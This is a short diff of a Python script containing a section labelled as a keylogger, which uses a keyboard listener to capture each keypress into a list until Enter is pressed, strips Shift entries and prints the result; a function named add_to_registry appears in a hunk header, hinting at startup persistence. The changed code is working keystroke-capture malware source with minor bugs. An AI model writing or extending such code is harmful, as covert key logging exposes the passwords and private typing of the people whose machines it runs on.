@@ -168,24 +168,35 @@ def add_to_registry(program_name):
 
 
 # key logger
-string = ""
+inputList = []
 
 def on_press(key):
-    global string
+    global inputList
 
     try:
         if key == keyboard.Key.enter:
             return False
         
+        if key == key.space:
+            inputList += " "
+        
         else:
             # print('alphanumeric key {0} pressed'.format(key.char))
-            string += format(key.char)
+            inputList.append(format(key.char))
 
     except AttributeError:
         # print('special key {0} pressed'.format(key))
-        string += format(key)
+        inputList.append(format(key))
     
     # return string
+
+
+def remove_shift(list):
+    for item in list:
+        if item == 'Key.shift':
+            list.remove(item)
+    return list
+
 
 def key_log():
     # Collect events until released
@@ -196,4 +207,4 @@ def key_log():
     listener.start()
 
 key_log()
-print("logged string: " + string)
+print(remove_shift(inputList))
